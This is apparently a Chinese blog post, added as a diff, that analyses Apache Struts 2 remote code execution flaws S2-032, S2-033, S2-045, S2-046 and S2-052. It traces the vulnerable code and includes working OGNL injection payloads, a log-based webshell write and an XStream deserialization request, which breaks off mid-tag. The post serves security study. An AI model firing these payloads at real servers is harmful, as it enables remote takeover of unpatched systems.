+    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250412164622939.png" srcset="/img/loading.gif" lazyload alt="image-20250412164622939" style="zoom:40%;" />
+    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250412170755264.png" srcset="/img/loading.gif" lazyload alt="image-20250412164837078" style="zoom:60%;" />
+</center>
+
+<p>然后我们就可以访问 <code>D:/data</code> 目录下的文件了</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250412170620040.png" srcset="/img/loading.gif" lazyload alt="image-20250412170620040" style="zoom:50%;" />
+
+<p>当然他的危害远不止于此，还是有师傅研究出了 RCE</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima">class.classLoader.resources.<span class="hljs-built_in">context</span>.parent.pipeline.<span class="hljs-built_in">first</span>.<span class="hljs-built_in">directory</span>=webapps/ROOT<br>class.classLoader.resources.<span class="hljs-built_in">context</span>.parent.pipeline.<span class="hljs-built_in">first</span>.<span class="hljs-built_in">prefix</span>=shell<br>class.classLoader.resources.<span class="hljs-built_in">context</span>.parent.pipeline.<span class="hljs-built_in">first</span>.suffix=.jsp<br>class.classLoader.resources.<span class="hljs-built_in">context</span>.parent.pipeline.<span class="hljs-built_in">first</span>.fileDateFormat=<span class="hljs-number">1</span><br>&lt;%Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<span class="hljs-symbol">%</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<p>利用日志写了一个 webshell</p>
+<p>在 <code>2.3.16.1</code> 的 excludeParams 加入了 <code>^class\..</code> 这也很好绕过，大小写就可以</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">class</span>[<span class="hljs-string">&#x27;classLoader&#x27;</span>].resources.dirContext.docBase=<br>top.<span class="hljs-keyword">class</span>.classLoader.resources.dirContext.docBase=<br><span class="hljs-keyword">Class</span>.classLoader.resources.dirContext.docBase=<br></code></pre></td></tr></table></figure>
+
+<p>后续 S2-022 就是把注入点改到 cookie 中了</p>
+<h2 id="S2-032"><a href="#S2-032" class="headerlink" title="S2-032"></a>S2-032</h2><p>影响版本：Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3) </p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-032">https://cwiki.apache.org/confluence/display/WW/S2-032</a></p>
+<p>当启用动态方法调用时，有可能传递恶意表达式，该表达式可用于在服务器端执行任意代码。</p>
+<p>这其实也是对 S2-016 的扩展，这次把重心放到了 <code>method:</code> 这个前缀，当开启了 <code>Dynamic Method Invocation</code> 可以实现 RCE</p>
+<p>我们先来看  PrefixTrie 中 处理 method: 前缀的方法，看到一进来首先就是判断 allowDynamicMethodCalls 所以我们得开启这一特性</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412185934861.png" srcset="/img/loading.gif" lazyload alt="image-20250412185934861"></p>
+<p>在委托 <code>DefaultActionProxy</code> 代理的时候，会用 StringEscapeUtils.escapeHtml4() 这个进行编码，其实我们之前在 S2-015 也有提到过这个实体编码特性，当时是 escapeHtml ，没有对 <code>&#39;</code> 进行实体编码</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412190827855.png" srcset="/img/loading.gif" lazyload alt="image-20250412190827855"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt; → <span class="hljs-symbol">&amp;lt;</span><br>&gt; → <span class="hljs-symbol">&amp;gt;</span><br>&amp; → <span class="hljs-symbol">&amp;amp;</span><br>&quot; → <span class="hljs-symbol">&amp;quot;</span><br>&#x27; → <span class="hljs-symbol">&amp;apos;</span><br></code></pre></td></tr></table></figure>
+
+<p>同时在 DefaultActionInvocation#invokeAction 解析 method 的时候，会为它拼接上一个 <code>()</code> 符号</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412191657068.png" srcset="/img/loading.gif" lazyload alt="image-20250412191657068"></p>
+<p>在 struts-default.xml 中 可以看到 excludedClasses 和 excludedPackageNamePatterns 的规则</p>
+<p>我们需要绕过，或者给他置空</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412192551013.png" srcset="/img/loading.gif" lazyload alt="image-20250412192551013"></p>
+<p>allowStaticMethodAccess 反射赋值的方式被禁止了，因为在 2.3.20 版本以后，SecurityMemberAccess 引入了一个新的判断方法 <code>isClassExcluded()</code></p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250412193151390.png" srcset="/img/loading.gif" lazyload alt="image-20250412193151390" style="zoom:50%;" />
+
+<p>反射获得的 class 在这里就直接返回 true，被拦截了</p>
+<p>我们可以使用 OgnlContext 里默认的 DefaultMemberAccess  来给他赋值</p>
+<h3 id="pyload"><a href="#pyload" class="headerlink" title="pyload"></a>pyload</h3><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">method</span>:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.param[<span class="hljs-number">0</span>]).toString&amp;param=calc<br></code></pre></td></tr></table></figure>
+
+<p>url 编码，不要把 &amp; 和 &#x3D; 进行编码</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">method%3A%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%40java.lang.Runtime%40getRuntime().<span class="hljs-keyword">exec</span>(%23parameters.param%5B0%5D).toString&amp;param=calc<br></code></pre></td></tr></table></figure>
+
+<p>或者 使用 ProcessBuilder 这个非静态方法</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">method</span>:#_memberAccess.excludedClasses=@java.util.Collections@EMPTY_SET,#_memberAccess.excludedPackageNamePatterns=@java.util.Collections@EMPTY_SET,<span class="hljs-keyword">new</span> java.lang.ProcessBuilder(<span class="hljs-keyword">new</span> java.lang.String[]<span class="hljs-comment">&#123;#parameters.cmd[0]&#125;</span>).start&amp;cmd=calc<br></code></pre></td></tr></table></figure>
+
+<p>url 编码后</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">method<span class="hljs-meta">%3A</span><span class="hljs-meta">%23_memberAccess</span>.excludedClasses<span class="hljs-meta">%3D</span><span class="hljs-meta">%40java</span>.util.Collections<span class="hljs-meta">%40EMPTY_SET</span><span class="hljs-meta">%2C</span><span class="hljs-meta">%23_memberAccess</span>.excludedPackageNamePatterns<span class="hljs-meta">%3D</span><span class="hljs-meta">%40java</span>.util.Collections<span class="hljs-meta">%40EMPTY_SET</span><span class="hljs-meta">%2Cnew</span><span class="hljs-meta">%20java</span><span class="hljs-built_in">.lang</span>.ProcessBuilder(new<span class="hljs-meta">%20java</span><span class="hljs-built_in">.lang</span>.String<span class="hljs-meta">%5B</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%7B</span><span class="hljs-meta">%23parameters</span>.cmd<span class="hljs-meta">%5B0</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%7D</span>).<span class="hljs-keyword">start</span>&amp;cmd=calc<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412205245232.png" srcset="/img/loading.gif" lazyload alt="image-20250412205245232"></p>
+<h2 id="S2-033"><a href="#S2-033" class="headerlink" title="S2-033"></a>S2-033</h2><p>影响版本：Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3) </p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-033">https://cwiki.apache.org/confluence/display/WW/S2-033</a></p>
+<p>使用了 struts2-rest-plugin-2.3.24.1.jar 这个插件时，由于动态方法调用时对 methodName 没有进行处理，导致了漏洞。</p>
+<p>跟 S2-032 很相似，这次使用的就是插件中的 RestActionMapper，在处理时没有过滤，导致了 RCE</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412214729940.png" srcset="/img/loading.gif" lazyload alt="image-20250412214729940"></p>
+<p>使用 ! 作为前缀，调用其他方法（放入 ActionMapping）中</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412214753022.png" srcset="/img/loading.gif" lazyload alt="image-20250412214753022"></p>
+<p>但是默认的后缀有所区别</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250412215151649.png" srcset="/img/loading.gif" lazyload alt="image-20250412215151649"></p>
+<h3 id="pyload-1"><a href="#pyload-1" class="headerlink" title="pyload"></a>pyload</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">!<span class="hljs-comment">#_memberAccess=<span class="hljs-doctag">@ognl</span>.OgnlContext<span class="hljs-doctag">@DEFAULT</span>_MEMBER_ACCESS,<span class="hljs-doctag">@java</span>.lang.Runtime<span class="hljs-doctag">@getRuntime</span>().exec(#parameters.param[0]).toString.json?param=calc</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h2><p>影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10 </p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-045">https://cwiki.apache.org/confluence/display/WW/S2-045</a></p>
+<p> <code>Content-Type</code> 的解析报错时，会把报错信息当表达式解析，造成了任意命令执行</p>
+<p>在 StrutsPrepareFilter#doFilter 对请求进行预处理时，会对请求进行封装</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413130240401.png" srcset="/img/loading.gif" lazyload alt="image-20250413130240401"></p>
+<p>最终调用的是 Dispatcher#wrapRequest 方法来进行 multipart&#x2F;form-data 获取内容，并封装为 MultiPartRequestWrapper <span style="color:#CC0000;">他用的 contains 进行判断</span></p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413130724051.png" srcset="/img/loading.gif" lazyload alt="image-20250413130724051"></p>
+<p>在 getMultiPartRequest 方法中 创建了 MultiPartRequest 实例，默认就是 default.properties 配置中的 JakartaMultiPartRequest </p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413132456568.png" srcset="/img/loading.gif" lazyload alt="image-20250413132456568"></p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413132523350.png" srcset="/img/loading.gif" lazyload alt="image-20250413132523350"></p>
+<p>获取到 mpr 后，进行MultiPartRequestWrapper的封装，执行 <code>parse</code> 对 <code>errors</code> 进行获取并添加到 errors集合中</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413133011869.png" srcset="/img/loading.gif" lazyload alt="image-20250413133011869"></p>
+<p><code>parse</code> 其实就是 JakartaMultiPartRequest#parse 这个方法，他会在 catch 块里对 异常进行捕获并保存</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413133456501.png" srcset="/img/loading.gif" lazyload alt="image-20250413133456501"></p>
+<p>而在 buildErrorMessage 方法中执行了 LocalizedTextUtil.findText() 解析了 error</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413142038871.png" srcset="/img/loading.gif" lazyload alt="image-20250413142038871"></p>
+<p>最终会调用到 TextParseUtil.translateVariables</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413144231784.png" srcset="/img/loading.gif" lazyload alt="image-20250413144231784"></p>
+<p>调用栈</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">getDefaultMessage:<span class="hljs-number">677</span>, LocalizedTextUtil (com<span class="hljs-selector-class">.opensymphony</span><span class="hljs-selector-class">.xwork2</span>.util)<br>findText:<span class="hljs-number">544</span>, LocalizedTextUtil (com<span class="hljs-selector-class">.opensymphony</span><span class="hljs-selector-class">.xwork2</span>.util)<br>findText:<span class="hljs-number">372</span>, LocalizedTextUtil (com<span class="hljs-selector-class">.opensymphony</span><span class="hljs-selector-class">.xwork2</span>.util)<br>buildErrorMessage:<span class="hljs-number">123</span>, JakartaMultiPartRequest (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span><span class="hljs-selector-class">.dispatcher</span>.multipart)<br>parse:<span class="hljs-number">105</span>, JakartaMultiPartRequest (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span><span class="hljs-selector-class">.dispatcher</span>.multipart)<br>&lt;init&gt;:<span class="hljs-number">84</span>, MultiPartRequestWrapper (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span><span class="hljs-selector-class">.dispatcher</span>.multipart)<br>wrapRequest:<span class="hljs-number">838</span>, Dispatcher (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br>wrapRequest:<span class="hljs-number">137</span>, PrepareOperations (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span><span class="hljs-selector-class">.dispatcher</span>.ng)<br>doFilter:<span class="hljs-number">91</span>, StrutsPrepareAndExecuteFilter (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span><span class="hljs-selector-class">.dispatcher</span><span class="hljs-selector-class">.ng</span>.<span class="hljs-attribute">filter</span>)<br></code></pre></td></tr></table></figure>
+
+<p>报错信息是如何可控的呢？</p>
+<p>在 JakartaMultiPartRequest#processUpload 中 调用 parseRequest</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413171908430.png" srcset="/img/loading.gif" lazyload alt="image-20250413171908430"></p>
+<p>FileUploadBase#parseRequest 有 %s 接收 e.getMessage())  e </p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413172103948.png" srcset="/img/loading.gif" lazyload alt="image-20250413172103948"></p>
+<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">Content-<span class="hljs-built_in">Type</span>: -multipart/form-data-%&#123;#_memberAccess=<span class="hljs-meta">@ognl</span>.OgnlContext<span class="hljs-meta">@DEFAULT</span>_MEMBER_ACCESS,<span class="hljs-meta">@java</span>.lang.Runtime<span class="hljs-meta">@getRuntime</span>().exec(<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413142002636.png" srcset="/img/loading.gif" lazyload alt="image-20250413142002636"></p>
+<h2 id="S2-046"><a href="#S2-046" class="headerlink" title="S2-046"></a>S2-046</h2><p>影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10 </p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-046">https://cwiki.apache.org/confluence/display/WW/S2-046</a></p>
+<p>S2-046和前面的S2-045 触发方式是一样的，但是入口不同</p>
+<p>在 JakartaMultiPartRequest#processUpload 同样对文件名做了处理</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413172406781.png" srcset="/img/loading.gif" lazyload alt="image-20250413172406781"></p>
+<p>会调用  getName() 方法</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413172622525.png" srcset="/img/loading.gif" lazyload alt="image-20250413172622525"></p>
+<p>跟前调用 Streams#checkFileName 这个方法</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250413184620091.png" srcset="/img/loading.gif" lazyload alt="image-20250413184620091"></p>
+<p>可以发现满足有 <code>fileName != null &amp;&amp; fileName.indexOf(0) != -1</code> 也就是满足有 <code>\u0000</code></p>
+<p>payload和 S2-045 是一样的，只是换到了 filename 这个变量上</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">\u0000%&#123;#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().<span class="hljs-keyword">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="S2-052"><a href="#S2-052" class="headerlink" title="S2-052"></a>S2-052</h2><p>影响版本：Struts 2.1.6 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12 </p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-052">https://cwiki.apache.org/confluence/display/WW/S2-052</a></p>
+<p>REST 插件使用带有 XStream 实例的<code>XStreamHandler</code>进行反序列化，且没有任何类型过滤，在反序列化 XML 有效负载时，这可能会导致远程代码执行。</p>
+<p>我 REST 插件的配置文件中，注册了一个 <code>org.apache.struts2.rest.ContentTypeInterceptor</code> ,用来根据不同的contentType 来获取不同的 <code>ContentTypeHandler</code>  解析请求的处理</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414100846761.png" srcset="/img/loading.gif" lazyload alt="image-20250414100846761"></p>
+<p>看一下这个getHandlerForRequest</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> ContentTypeHandler <span class="hljs-title function_">getHandlerForRequest</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-type">ContentTypeHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">// 1. 首先尝试通过请求的Content-Type头获取处理器</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">contentType</span> <span class="hljs-operator">=</span> request.getContentType();<br>    <span class="hljs-keyword">if</span> (contentType != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// 1.1 直接匹配完整的Content-Type</span><br>        handler = (ContentTypeHandler)<span class="hljs-built_in">this</span>.handlersByContentType.get(contentType);<br>        <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// 1.2 如果完整匹配失败，尝试去掉参数部分(如去掉charset=UTF-8等)</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> contentType.indexOf(<span class="hljs-number">59</span>); <span class="hljs-comment">// 59是分号&#x27;;&#x27;的ASCII码</span><br>            <span class="hljs-keyword">if</span> (index != -<span class="hljs-number">1</span>) &#123;<br>                contentType = contentType.substring(<span class="hljs-number">0</span>, index).trim();<br>            &#125;<br>            <span class="hljs-comment">// 1.3 再次尝试匹配简化后的Content-Type</span><br>            handler = (ContentTypeHandler)<span class="hljs-built_in">this</span>.handlersByContentType.get(contentType);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 2. 如果通过Content-Type没有找到处理器，尝试通过扩展名获取</span><br>    <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">extension</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.findExtension(request.getRequestURI());<br>        handler = (ContentTypeHandler)<span class="hljs-built_in">this</span>.handlersByExtension.get(extension);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> handler;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以发现会根据 Content-Type 或者 扩展名 来过去 ContentTypeHandler</p>
+<p>发现有 6 个实现</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414100626286.png" srcset="/img/loading.gif" lazyload alt="image-20250414100626286"></p>
+<p>我们主要来看 XStreamHandler 的处理，在 ContentTypeInterceptor 获取到 XStreamHandler 会去调用它的 toObject方法，对输入流进行处理</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414101018351.png" srcset="/img/loading.gif" lazyload alt="image-20250414101018351"></p>
+<p>fromXml 对 xml的输入流进行反序列化</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250414101204372.png" srcset="/img/loading.gif" lazyload alt="image-20250414101204372"></p>
+<h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /struts2_rest_showcase_war_exploded/orders.xhtml HTTP/1.1<br>Host: localhost:8080<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br>DNT: 1<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Content-Type: application/xml<br>Content-Length: 2359<br><br><span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">flags</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">flags</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataHandler</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">is</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.crypto.CipherInputStream&quot;</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">cipher</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.crypto.NullCipher&quot;</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">initialized</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">initialized</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">opmode</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">opmode</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">serviceIterator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">iter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">iter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.util.Collections$EmptyIterator&quot;</span>/&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">next</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">redirectErrorStream</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">redirectErrorStream</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">next</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">iter</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.imageio.ImageIO$ContainsFilter&quot;</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">method</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">parameter-types</span>/&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">method</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">next</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;string&quot;</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">next</span>&gt;</span><br>                                <span class="hljs-tag">&lt;/<span class="hljs-name">serviceIterator</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">lock</span>/&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">cipher</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder$NullInputStream&quot;</span>/&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">ibuffer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ibuffer</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">done</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">done</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">ostart</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">ostart</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">ofinish</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">ofinish</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">closed</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">closed</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">is</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">consumed</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">consumed</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">transferFlavors</span>/&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">dataHandler</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span 